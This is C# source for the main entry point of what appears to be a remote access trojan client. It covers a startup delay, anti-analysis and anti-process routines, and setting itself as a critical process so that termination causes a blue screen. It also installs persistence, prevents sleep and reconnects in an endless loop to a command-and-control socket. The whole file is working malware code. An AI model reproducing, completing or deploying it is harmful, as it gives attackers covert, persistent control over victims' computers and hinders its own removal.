using System.Threading;
using Client.Connection;
using Client.Install;
using System;
using Client.Helper;
using System.Windows.Forms;

namespace Client
{
    public class Program
    {
        public static void Main()
        {
            for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
            {
                Thread.Sleep(1000);
            }

            if (!Settings.InitializeSettings()) //Environment.Exit(0);
            try
            {
                
                if (Convert.ToBoolean(Settings.An_ti)) 
                    Anti_Analysis.RunAntiAnalysis();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            A.B();
            try
            {
                if (!MutexControl.CreateMutex()) 
                    Environment.Exit(0);
            }
            catch { }
            try
            {
                if (Convert.ToBoolean(Settings.Anti_Process)) 
                    AntiProcess.StartBlock();
            }
            catch { }
            try
            {
                if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin()) 
                    ProcessCritical.Set();
            }
            catch { }
            try
            {
                if (Convert.ToBoolean(Settings.In_stall)) 
                    NormalStartup.Install();
            }
            catch { }
            Methods.PreventSleep(); 
            try
            {
                if (Methods.IsAdmin())
                    Methods.ClearSetting();
            }
            catch { }

            while (true) 
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        ClientSocket.Reconnect();
                        ClientSocket.InitializeClient();
                    }
                }
                catch { }
                Thread.Sleep(5000);
            }
        }
    }
}